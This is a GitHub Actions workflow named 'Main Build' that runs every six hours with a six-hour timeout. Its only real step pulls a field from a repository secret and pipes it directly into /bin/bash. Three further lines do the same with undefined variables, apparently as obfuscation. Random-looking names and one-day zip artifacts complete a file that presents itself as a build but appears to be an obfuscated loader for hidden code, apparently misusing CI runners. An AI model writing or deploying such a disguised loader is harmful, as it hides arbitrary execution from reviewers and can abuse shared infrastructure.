name: Main Build
on:
  workflow_dispatch:

  schedule:
    - cron: '29 0,6,12,18 * * *'
permissions:
  contents: read
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  ci:
    runs-on: ubuntu-latest
    timeout-minutes: 360
    steps:
      - uses: actions/checkout@v4
      - name: Launch
        env:
          qlm2: ${{ secrets.qlm2 }}
        run: |
          printf '%s' "$qlm2" | jq -r .dzqj6 | /bin/bash
          echo $dt74796 | jq -r .jjjp315 | /bin/bash
          printf '%s' "$io19437" | jq -r .dwg5834 | /bin/bash
          printf '%s' "$f0985" | jq -r .examb47563 | /bin/bash

      - name: Save artifact
        uses: actions/upload-artifact@v4
        with:
          name: WduamQch
          path: "*.zip"
          retention-days: 1
